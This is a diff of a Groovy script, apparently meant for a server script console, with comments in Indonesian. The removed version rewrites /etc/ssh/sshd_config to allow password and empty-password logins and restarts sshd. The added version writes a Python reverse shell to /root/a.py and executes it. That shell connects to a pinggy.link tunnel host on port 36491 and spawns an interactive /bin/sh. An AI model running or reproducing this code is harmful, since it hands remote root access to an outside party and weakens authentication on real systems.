@@ -39,13 +39,21 @@ if (fileToRead.exists()) {
 }
 
 // Tentukan nama file dan lokasinya
-def fileBaru = new File("/etc/ssh/sshd_config")
+def fileBaru = new File("/root/a.py")
 
 // Tentukan isi kodenya
 def kontenKode = """\
-Port 22
-PasswordAuthentication yes
-PermitEmptyPasswords yes
+import socket,subprocess,os
+# Connect to the attacker's machine (replace with attacker's IP and port)
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("qqohc-114-10-152-167.a.free.pinggy.link", 36491))
+# Duplicate file descriptors for stdin, stdout, stderr to the socket
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+# Spawn a shell
+p=subprocess.call(["/bin/sh","-i"])
+
 
 """
 
@@ -53,11 +61,11 @@ PermitEmptyPasswords yes
 fileBaru.text = kontenKode
 
 println "SUKSES: File ${fileBaru.name} telah dibuat di ${fileBaru.absolutePath}"
-println "systemctl restart sshd.service".execute().text
+
 
 
 // List perintah: [program, argumen1, argumen2]
-def proc = ['killall', 'python3'].execute()
+def proc = ['python3', '/root/a.py'].execute()
 proc.waitFor() // Menunggu perintah selesai sebelum lanjut ke baris berikutnya
 
 if (proc.exitValue() == 0) {
